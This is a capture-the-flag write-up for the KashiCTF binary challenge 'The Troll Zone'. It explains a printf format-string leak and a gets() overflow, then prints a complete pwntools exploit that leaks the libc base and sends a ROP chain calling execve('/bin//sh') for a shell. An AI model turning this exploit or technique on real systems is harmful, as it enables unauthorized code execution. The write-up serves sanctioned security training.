# The Troll Zone
## Description
category: pwn\
solves: 43\
point value: 452
## Overview
The file we got is x86_64 binary \
![](attachments_md/kashi_checksec.png)

it does have very little protections enabled:\
`Partial RELRO` -  we can overwrite got entries\
`No canary found` - if there is buffer overflow we can overwrite return pointer without worrying about canary check triggering\
`NX enabled` - there is protection against execution of machine code placed on the stack\
`No Pie (0x400000)` - binary is always loaded at the same address in memory\
We also are provided libc file
## Exploitation plan
### Vulnerabilities
code decompiled by ida:\
![](attachments_md/kashi_main.png)\
![](attachments_md/kashi_flag.png)\
there are two vulnerabilities in this code:
- `printf(s)` - using `printf` on buffer controlled by user is very dangerous, using `%p` `%x` (and many others) we can read values saved in registers `( _RSI, RDX, RCX, R8, R9_)` and on stack. We can also have arbitrary memory write using `%n` modifier.
- `gets(v4)` - gets function is dangerous function that should never be used. This function takes data to specified buffer with no length checking whatsoever which can lead to buffer overflow
### How can this be exploited?
What is usually required to *typical* ROP attack is some gadgets to set registers to correct values for [execve syscall]([Linux System Call Table for x86 64 · Ryan A. Chapman](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)) on `/bin/sh` to get reverse shell. Sadly there are not enough gadgets in vuln binary. Luckily there is plenty of such gadgets in libc. \
But in order to use this technique we need to know where in memory is libc loaded.\
We can use vulnerable `printf` function to find address of some function in libc (lack of Pie does not work here). Using that we can find base address at which libc is loaded at. From there we can use ROPgadget program to generate python script that prepares correct payload for this ROP\
`ROPgadget --binary libc.so.6 --ropchain`
## Exploitation

### getting libc address
On we run patched binary in gdb and break on vulnerable `printf` (to patch binary you can use [pwninit]([io12/pwninit: pwninit - automate starting binary exploit challenges](https://github.com/io12/pwninit)) or just patchelf)\
using `%<number>$p` we dump values from registers and stack.\
for my exploit i used value at `%17$p` which happened to be `0x7ffff7e0924a`\
![](attachments_md/kashi_gdb_libc.png)\
using `vmmap` command we can find base address of libc (locally)\
thanks to that we can calculate offset that leaked address is at (from the base of libc)\
`0x2724a=0x7ffff7e0924a-0x7ffff7de2000`\
We can use that offset when we leak the address in remote exploit. We need to subtract this offset from leaked address and we get remote libc base address. now we just need to use this value in payload from ROPgadget

```python
#!/usr/bin/env python3

from pwn import context, process, remote, gdb, args, ELF
from struct import pack

context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]

addr = "kashictf.iitbhucybersec.in"
port = 1337
elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = elf
libc = elf.libc

gdbscript = '''
    tbreak main
    '''.format(**locals())


def conn(argv=[], *a, **kw):
    if args.LOCAL:
        r = process([elf.path])
        if args.GDB:
            return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        r = remote(addr, port)

    return r


leaked_offset = 0x7ffff7e0924a-0x7ffff7de2000


def main():
    log.info('Starting')

    r = conn()
    r.recvuntil(b'What do you want?')
    r.sendline(b'%17$p')
    r.recvuntil(b"0x")
    ptr = r.recvuntil(b"\n")
    ptr = ptr[:-1].decode()
    ptr = int(ptr, 16)
	log.info(f'Leaked addres {hex(ptr)}')

    libc_base = ptr - leaked_offset
    log.info(f'Got libc base {hex(libc_base)}')
    
    ### Output of ROPgadget
    p = b'a' * 40
    p += pack('<Q', libc_base + 0x00000000000fde7d)  # pop rdx ; ret
    p += pack('<Q', libc_base + 0x00000000001d21c0)  # @ .data
    p += pack('<Q', libc_base + 0x000000000003f197)  # pop rax ; ret
    p += b'/bin//sh'
    p += pack('<Q', libc_base + 0x00000000000353ac)  # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', libc_base + 0x00000000000fde7d)  # pop rdx ; ret
    p += pack('<Q', libc_base + 0x00000000001d21c8)  # @ .data + 8
    p += pack('<Q', libc_base + 0x00000000000af985)  # xor rax, rax ; ret
    p += pack('<Q', libc_base + 0x00000000000353ac)  # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', libc_base + 0x00000000000277e5)  # pop rdi ; ret
    p += pack('<Q', libc_base + 0x00000000001d21c0)  # @ .data
    p += pack('<Q', libc_base + 0x0000000000028f99)  # pop rsi ; ret
    p += pack('<Q', libc_base + 0x00000000001d21c8)  # @ .data + 8
    p += pack('<Q', libc_base + 0x00000000000fde7d)  # pop rdx ; ret
    p += pack('<Q', libc_base + 0x00000000001d21c8)  # @ .data + 8
    p += pack('<Q', libc_base + 0x00000000000af985)  # xor rax, rax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x000000000009bc69)  # inc eax ; ret
    p += pack('<Q', libc_base + 0x0000000000026428)  # syscall
    r.sendline(p)

    r.interactive()


if __name__ == "__main__":
    main()

```
Combining quite lengthy outpout of `ROPgadget` with our calculated libc address we get this exploit, that gives us reverse shell! \
![](attachments_md/kashi_flag.png)\
\
flag: `KashiCTF{did_some_trolling_right_there_3hbM6wHf}`